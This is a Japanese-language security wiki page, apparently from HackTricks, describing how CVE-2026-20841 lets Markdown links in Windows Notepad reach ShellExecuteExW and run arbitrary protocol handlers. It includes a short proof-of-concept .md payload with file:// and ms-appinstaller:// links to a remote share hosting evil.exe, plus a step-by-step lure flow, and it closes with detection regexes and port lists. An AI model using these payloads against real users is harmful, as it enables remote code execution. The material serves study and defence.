# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Markdown/HTML をレンダリングする近年の Windows アプリケーションは、ユーザー提供のリンクをクリック可能な要素に変換し、それを `ShellExecuteExW` に渡すことがよくあります。スキームの厳密な許可リストがないと、登録されている任意のプロトコルハンドラ（例：`file:`, `ms-appinstaller:`）が起動され、現在のユーザーコンテキストでコードが実行される可能性があります。

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad は `sub_1400ED5D0()` 内の固定文字列比較により、**`.md` 拡張子の場合のみ** Markdown モードを選択します。
- サポートされる Markdown リンク:
- Standard: `[text](target)`
- Autolink: `<target>`（レンダリング時は `[target](target)` になる）、したがって両方の構文が payload と検出に影響します。
- リンクのクリックは `sub_140170F60()` で処理され、そこでは弱いフィルタリングを行った後に `ShellExecuteExW` を呼び出します。
- `ShellExecuteExW` は HTTP(S) に限らず、構成されている**任意のプロトコルハンドラ**にディスパッチします。

### Payload に関する考慮事項
- リンク内の `\\` 文字列は `ShellExecuteExW` の前に **`\` に正規化されます**。これにより UNC/パスの作成や検出に影響があります。
- `.md` ファイルはデフォルトで Notepad に関連付けられていません；被害者はファイルを Notepad で開いてリンクをクリックする必要がありますが、一度レンダリングされるとリンクはクリック可能になります。
- 危険な例のスキーム:
- `file://` はローカル/UNC の payload を起動するために利用され得ます。
- `ms-appinstaller://` は App Installer のフローをトリガーします。他にもローカルに登録されたスキームは悪用可能な場合があります。

### 最小限の PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### 悪用の流れ
1. NotepadがMarkdownとしてレンダリングするように**`.md`ファイル**を作成する。
2. 危険なURIスキーム（`file:`, `ms-appinstaller:`, またはインストールされている任意のハンドラ）を使ってリンクを埋め込む。
3. ファイルを配布する（HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMBなど）およびユーザにNotepadで開かせるよう誘導する。
4. クリックされると、**正規化されたリンク**が`ShellExecuteExW`に渡され、対応するプロトコルハンドラがユーザコンテキストで参照されたコンテンツを実行する。

## 検出のアイデア
- ドキュメント配信によく使われるポート/プロトコルでの`.md`ファイルの転送を監視する: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdownリンク（standard と autolink）を解析し、**大文字小文字を区別しない**`file:`または`ms-appinstaller:`を探す。
- リモートリソースアクセスを検出するためのベンダー推奨の正規表現:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- パッチの挙動は報告によれば **allowlists local files and HTTP(S)**; `ShellExecuteExW` に到達するそれ以外のものは疑わしい。システムによって attack surface が異なるため、必要に応じて他のインストールされている protocol handlers に対する検出を拡張してください。

## 参考
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
